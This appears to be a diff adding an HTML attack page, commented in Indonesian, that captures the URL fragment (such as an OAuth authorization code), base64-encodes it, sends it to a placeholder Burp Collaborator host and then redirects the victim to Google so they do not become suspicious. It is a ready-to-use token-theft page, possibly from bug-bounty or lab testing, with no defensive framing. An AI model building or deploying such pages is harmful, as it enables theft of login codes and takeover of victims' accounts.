@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <script>
+        // 1. Cek apakah ada data di belakang tanda '#' (seperti #code=123)
+        var fragment = window.location.hash;
+
+        if (fragment) {
+            // 2. Kirim data itu ke Burp Collaborator-mu agar kamu bisa baca kodenya
+            // Ganti link di bawah dengan link Collaborator-mu
+            fetch("https://[ID-COLLABORATOR-MU].oastify.com/?curian=" + btoa(fragment));
+            
+            // 3. Alihkan korban ke Google agar mereka tidak curiga
+            window.location.href = "https://google.com";
+        }
+    </script>
+    <h1>Loading... Please wait...</h1>
+</body>
+</html>
